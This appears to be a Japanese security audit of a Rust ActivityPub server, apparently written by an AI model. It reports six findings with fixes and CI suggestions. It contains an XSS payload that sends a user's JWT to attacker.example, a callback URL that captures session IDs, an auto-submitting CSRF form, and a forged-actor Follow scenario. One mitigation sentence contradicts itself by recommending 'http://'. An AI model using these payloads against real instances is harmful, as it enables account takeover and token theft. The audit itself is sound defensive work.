# seiran セキュリティ診断レポート

診断日: 2026-07-02  
診断者: Claude Sonnet 4.6（セキュリティ専門家ロール）

---

## 1. 診断サマリー

| 深刻度 | 件数 |
|--------|------|
| 高     | 1    |
| 中     | 3    |
| 低     | 2    |
| **合計** | **6** |

診断対象コードは全体的にパラメータ化クエリ（SQLインジェクション対策）・Argon2によるパスワードハッシュ・JWT秘密鍵の自動生成・ファイルパーミッション設定など、基本的なセキュリティプラクティスを採用しており良好な水準にある。主要な問題はActivityPubプロトコル固有の署名検証ロジックとMiAuth HTML生成に集中している。

---

## 2. 脆弱性リスト（優先度順）

---

### [HIGH-01] ActivityPub Inbox — 署名者とアクターの対応検証が欠落

**深刻度**: 高  
**該当箇所**: `crates/seiran-federation-inbox/src/handlers/inbox.rs`（`inbox_handler`関数）  
**関連ファイル**: `crates/seiran-common/src/ap/client.rs`（`verify_signature`関数）

#### 脆弱性内容

`inbox_handler` は受信した ActivityPub リクエストに対して HTTP Signatures の署名検証を行うが、以下の 2 点が欠落している。

**① ボディ完全性検証の欠如（Digest ヘッダー未必須化）**

`verify_signature` は Signature ヘッダーの `headers=` フィールドに列挙されたヘッダーのみを検証対象とする。攻撃者が `headers="(request-target) host date"` のようにリクエストボディを含む `digest` を省略した Signature ヘッダーを送信した場合、ボディの内容は暗号学的に検証されない。

```rust
// client.rs L150 — headers= が無ければ "date" のみ
let header_list_str = parsed.get("headers").cloned().unwrap_or_else(|| "date".to_string());
let signing_string = build_signing_string(method, path, headers, &header_list_str)?;
```

**② 署名鍵の所有者とアクティビティの actor フィールドの一致検証欠如**

署名検証後、ハンドラはアクティビティ JSON の `actor` フィールドをそのまま信用して DB に書き込む。しかし署名検証で使用した鍵（`keyId`）が `actor` と同じ主体のものかどうか確認していない。

```rust
// inbox.rs L116 — actor は署名されていないボディから直接取得
let follower_uri = activity["actor"].as_str()...;
// ① が原因でボディが署名対象外の場合、follower_uri は改ざん可能
```

#### 攻撃シナリオ

1. 攻撃者は自前の Fediverse サーバー（`attacker.example`）を運営し、正当な鍵ペアを持つ
2. 以下の Follow アクティビティを作成する:
   ```json
   {
     "@context": "...",
     "type": "Follow",
     "actor": "https://mastodon.social/users/alice",
     "object": "https://seiran.example/users/bob"
   }
   ```
3. Signature ヘッダーを `headers="(request-target) host date"` として**自分の秘密鍵で署名**し seiran の `/inbox` へ送信する
4. seiran は署名検証を実施 → `keyId` = `https://attacker.example/users/evil#main-key` の公開鍵で検証成功
5. ハンドラはアクティビティの `actor` フィールドから `follower_uri = "https://mastodon.social/users/alice"` を取得し、Mastodon の alice がフォローしたとして DB に記録する
6. `handle_create_note` も同様に、任意のリモートユーザーを詐称した投稿を DB に注入できる

#### 対策案

**必須対応:**

1. **Digest ヘッダーを必須化**: `inbox_handler` でリクエストを受け取った直後にボディの SHA-256 Digest を計算し、ヘッダーの `Digest` 値と比較する。また `headers=` に `digest` が含まれていない Signature は拒否する。

```rust
// inbox_handler に追加
let body_hash = sha2::Sha256::digest(&body);
let expected_digest = format!("SHA-256={}", base64::encode(body_hash));
if header_map.get("digest") != Some(&expected_digest) {
    return (StatusCode::UNAUTHORIZED, "Digest 不一致").into_response();
}
// さらに Signature の headers= に "digest" が含まれることを確認
```

2. **actor-keyId の対応検証**: 署名検証後、`keyId` に含まれるアクター URI（フラグメント除去後）とアクティビティの `actor` フィールドが一致することを確認する。

```rust
let key_actor_base = key_id.split('#').next().unwrap_or(key_id);
if key_actor_base != activity["actor"].as_str().unwrap_or("") {
    return (StatusCode::UNAUTHORIZED, "署名者とアクターが一致しません").into_response();
}
```

---

### [MED-01] MiAuth 認可ページ — Reflected XSS

**深刻度**: 中  
**該当箇所**: `crates/seiran-api/src/handlers/miauth.rs`、L85-112（`miauth_page` 関数）

#### 脆弱性内容

`miauth_page` はクエリパラメータ `name` をそのまま HTML に埋め込む。HTML エスケープ処理が一切行われていない。

```rust
// miauth.rs L85–109
let html = format!(
    r#"...
    <p>アプリ <strong>{}</strong> が seiran アカウントへのアクセスを求めています。</p>
    ..."#,
    query.name,  // ← エスケープなし
    session_id
);
Html(html).into_response()
```

`name=<script>document.location='https://attacker.example/?t='+localStorage.getItem('seiran_token')</script>` のような URL を踏んだログイン済みユーザーは、JWT トークンが窃取される。

**NOTE**: 現在の MiAuth ページは Authorization ヘッダーがなければログインページへリダイレクトされるため、ブラウザによる通常ナビゲーションでは直接的な XSS トリガーは困難。しかし MiAuth を利用するサードパーティアプリがウェブビューや API クライアントとして `Authorization` ヘッダー付きでこのページを取得・表示する場合に XSS が発火する。また、将来的に認証フローが変更された際のリスクがある。

#### 対策案

HTML 生成に `v_htmlescape` クレートや手動エスケープ関数を使用する。または Askama / Tera テンプレートエンジンへ移行する（自動エスケープが有効）。

```rust
fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;")
     .replace('<', "&lt;")
     .replace('>', "&gt;")
     .replace('"', "&quot;")
     .replace('\'', "&#x27;")
}

// 使用例
let html = format!(
    r#"<p>アプリ <strong>{}</strong> が...</p>"#,
    html_escape(&query.name)
);
```

---

### [MED-02] MiAuth 認可 callback — オープンリダイレクト

**深刻度**: 中  
**該当箇所**: `crates/seiran-api/src/handlers/miauth.rs`、L158-164（`miauth_authorize` 関数）

#### 脆弱性内容

`miauth_authorize` は認可後に `callback` URL へリダイレクトするが、リダイレクト先のドメインが許可リストに含まれるかどうかの検証がない。

```rust
if let Some(ref callback) = session.redirect_uri.clone() {
    let redirect_url = if callback.contains('?') {
        format!("{}&session={}", callback, session_id)
    } else {
        format!("{}?session={}", callback, session_id)
    };
    return Redirect::to(&redirect_url).into_response();  // ← 検証なし
}
```

#### 攻撃シナリオ

1. 攻撃者が `callback=https://attacker.example/steal` を指定した MiAuth URL をユーザーに踏ませる
2. ユーザーが認可ボタンを押すと `https://attacker.example/steal?session={session_id}` へリダイレクト
3. 攻撃者のサーバーが `POST /api/miauth/{session_id}/check` を呼び出し、miauth トークンを取得

#### 対策案

オープンリダイレクトの完全な防止には、アプリ登録時に `callback` の許可 URL を DB に登録し、認可時に照合する必要がある（OAuth 2.0 の `redirect_uri` 検証と同じアプローチ）。

短期的な対策として、`callback` が `https://` から始まり、かつ IP アドレスやローカルホストではないことを確認する。また、`callback` を `http://` プロトコルに限定する最低限のチェックを追加する。

```rust
fn is_valid_callback(url: &str) -> bool {
    let Ok(parsed) = url::Url::parse(url) else { return false; };
    matches!(parsed.scheme(), "https") &&
    parsed.host_str().map(|h| !h.starts_with("127.") && h != "localhost").unwrap_or(false)
}
```

---

### [MED-03] MiAuth 認可エンドポイント — CSRF 保護なし

**深刻度**: 中  
**該当箇所**: `crates/seiran-api/src/handlers/miauth.rs`（`miauth_authorize` 関数）  
**ルーティング**: `POST /miauth/:session_id/authorize`

#### 脆弱性内容

`miauth_authorize` は CSRF トークンの検証を行わない。MiAuth セッション ID はランダムな UUID ではなく攻撃者が任意の文字列を指定可能（UUID の検証なし）。

攻撃者が以下のような自動送信フォームを持つページをユーザーに訪問させることで、ユーザーが意図せずアプリを認可してしまう可能性がある。

```html
<!-- 攻撃者のページ -->
<form method="POST" action="https://seiran.example/miauth/attacker_session/authorize">
</form>
<script>document.forms[0].submit()</script>
```

**前提条件**: ユーザーが事前に `https://seiran.example/miauth/attacker_session?name=...` を訪問し、セッションにユーザー ID が格納されている必要がある（MED-01 の XSS と組み合わせることで達成可能）。また、現在の実装では認可はブラウザの Cookie ではなく Authorization ヘッダー経由の JWT で行われるため、単独での CSRF は困難だが、将来的なフロー変更時のリスクがある。

#### 対策案

1. セッション ID に UUID 形式を強制し、推測困難にする（現状は任意の文字列が使える）
2. 認可フォームに CSRF トークンを埋め込む（サーバー側でセッションに紐づいたトークンを発行・検証）
3. または `SameSite=Strict` Cookie を使って認可状態を管理する

---

### [LOW-01] パスワードリセット — トークン無効化のアトミック性欠如

**深刻度**: 低  
**該当箇所**: `crates/seiran-api/src/handlers/auth.rs`（`reset_password` 関数、L383-440）

#### 脆弱性内容

現在の実装は「トークン有効性確認」と「トークン消費（`used_at` セット）」が 2 つの独立したクエリで行われる。

```rust
// 1. 有効性確認（SELECT）
let row = sqlx::query_as("SELECT user_id FROM password_resets WHERE token=$1 AND used_at IS NULL AND expires_at > NOW()")
    .fetch_optional(&state.db).await?;

// 2. パスワード更新（UPDATE users）
sqlx::query("UPDATE users SET password_hash = $1 WHERE id = $2").execute(...).await?;

// 3. トークン消費（UPDATE password_resets）← ここまでの間が競合ウィンドウ
sqlx::query("UPDATE password_resets SET used_at = NOW() WHERE token = $1").execute(...).await?;
```

攻撃者がリセットトークンを傍受した場合、1 と 3 の間に競合状態が生じ、同一トークンで 2 者が同時にパスワードを変更できる可能性がある。

#### 対策案

`UPDATE ... RETURNING` でアトミックにトークン消費とユーザー ID 取得を行う:

```sql
UPDATE password_resets
SET used_at = NOW()
WHERE token = $1::uuid
  AND used_at IS NULL
  AND expires_at > NOW()
RETURNING user_id
```

このクエリが 0 行を返した場合（トークン既使用または期限切れ）はエラーを返す。パスワード更新はその後に実行する。

---

### [LOW-02] PostgreSQL ポートのホスト公開（本番環境リスク）

**深刻度**: 低（構成問題）  
**該当箇所**: `docker-compose.yml` L43-44

#### 脆弱性内容

```yaml
db:
  ports:
    - 5432:5432  # ← ホストの全インターフェースに公開
```

PostgreSQL のポートがホストマシン（`0.0.0.0:5432`）に公開されている。インターネットに面したサーバーで利用した場合、DB への直接アクセスが試みられるリスクがある。

DB コンテナは `internal` ネットワーク内にあり、`api` / `federation-inbox` / `worker` コンテナからのみアクセスされれば十分である。

#### 対策案

本番環境では `ports` の記述を削除し、`networks: - internal` のみに限定する。`psql` による管理操作が必要な場合は `docker compose exec db psql ...` または SSH トンネル経由で行う。

```yaml
# 本番 docker-compose.yml での推奨設定
db:
  # ports: 削除（外部からのアクセス不要）
  networks:
    - internal
```

---

## 3. CI 改善提案

### 3.1 依存クレートの脆弱性スキャン

```yaml
# .github/workflows/security.yml
- name: Audit Rust dependencies
  run: cargo install cargo-audit && cargo audit
```

`cargo-audit` は RustSec アドバイザリ DB を参照して既知の脆弱な依存クレートを検出する。

### 3.2 cargo-deny による許可ライセンス・バン依存管理

```yaml
- name: Check licenses and banned crates
  run: cargo install cargo-deny && cargo deny check
```

### 3.3 静的解析 / セキュリティ Lint

Clippy の `cargo clippy -- -D warnings` を CI で必須化する。`unwrap()` の乱用などのバグ要因もキャッチできる。

```yaml
- name: Clippy
  run: cargo clippy --workspace --all-features -- -D warnings
```

### 3.4 ActivityPub 署名検証の結合テスト

HIGH-01 で指摘したアクター詐称攻撃をテストするインテグレーションテストを追加することを推奨する。テストは以下を確認すべき:

1. `Signature` ヘッダーの `headers=` に `digest` が含まれないリクエストを 401 で拒否すること
2. リクエストボディの SHA-256 が `Digest` ヘッダーと一致しない場合に 401 を返すこと
3. `keyId` のアクター URI がアクティビティの `actor` フィールドと一致しない場合に 401 を返すこと

### 3.5 Semgrep によるカスタムルール

MiAuth ページのような `format!()` に直接ユーザー入力を渡してレスポンスを生成するパターンを検出するカスタム Semgrep ルールを作成する。

```yaml
rules:
  - id: rust-html-format-injection
    patterns:
      - pattern: |
          format!(r#"...<...{}...>"#, $VAR, ...)
    message: "User input directly interpolated into HTML string. Use html_escape()."
    languages: [rust]
    severity: WARNING
```

---

*このレポートは 2026-07-02 時点のコードを対象としており、将来の変更は反映されていません。*
